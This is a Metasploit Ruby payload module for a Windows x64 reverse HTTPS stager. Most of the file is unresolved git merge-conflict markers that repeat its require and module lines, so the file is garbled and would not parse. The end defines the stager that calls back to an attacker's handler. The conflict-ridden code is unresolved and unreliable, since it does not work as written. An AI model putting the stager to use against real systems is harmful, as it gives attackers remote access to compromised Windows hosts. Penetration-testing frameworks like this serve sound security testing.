##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
=======
#require 'msf/core/payload/windows/x64/reverse_https'
>>>>>>> feature/complex-payloads
=======
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
=======
=======
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
#require 'msf/core/payload/windows/x64/reverse_https'
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
>>>>>>> rapid7/master
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> 4.11.2_release_pre-rails4

=======
=======
>>>>>>> msf-complex-payloads
>>>>>>> rapid7/master

=======
=======
>>>>>>> rapid7/master
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4

=======
>>>>>>> rapid7/master
=======
#require 'msf/core/payload/windows/x64/reverse_https'
>>>>>>> pod/complex-payloads

=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> rapid7/master

=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4

>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> payload-generator.rb
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-gemfile-
<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> master
>>>>>>> payload-generator.rb
=======
>>>>>>> master
=======
>>>>>>> master
>>>>>>> pod/metasploit-gemfile-
=======
require 'msf/core/payload/windows/x64/reverse_https'

module Metasploit4

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
  CachedSize = 532

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows x64 wininet)',
      'Author'      => [ 'hdm', 'agix', 'rwincey' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86_64,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockrdi https',
      'Stager'      => { 'Payload' => '' }))
  end

end
